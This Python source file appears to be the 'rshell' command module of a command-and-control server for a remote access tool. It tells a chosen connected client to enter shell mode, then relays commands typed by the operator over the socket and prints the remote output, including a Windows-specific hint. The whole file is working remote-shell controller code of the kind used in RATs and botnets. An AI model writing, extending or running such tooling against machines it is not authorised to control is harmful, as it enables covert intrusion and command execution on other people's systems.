# commands/rshell.py
import subprocess
import threading

from colorama import Style, Fore

requires_id = True

argumentError = "Invalid arguments. Usage: rshell <client_id>"
requires_id = True

def execute(conn, args, clients, id):
    conn.sendall(b'RSHELL')
    # threading.Thread(target=rshell_thread, args=(conn,), daemon=True).start()
    rshell_thread(conn)


def rshell_thread(conn):
    hostname = conn.getpeername()[0]
    while True:
        command = input("<" + hostname + ">: " + Style.RESET_ALL)
        if command.lower() == 'exit':
            conn.sendall(b'exit')
            break
        conn.sendall(command.encode())
        results = b''

        while True:
            if results.endswith(b'\n'):
                break
            else:
                chunk = conn.recv(1024)
                if not chunk:
                    break
                results += chunk # you don't want to strip this, because then you'll lose the newline when the actual result includes a newline
        if results.decode("utf-8").strip() == 'NONE':
            print(Fore.YELLOW + "Warning:" + Style.RESET_ALL + " No results received. In Windows, this usually means the command succeeded.")
        else:
            print("<" + hostname + ">: {}".format(results.decode('utf-8')))
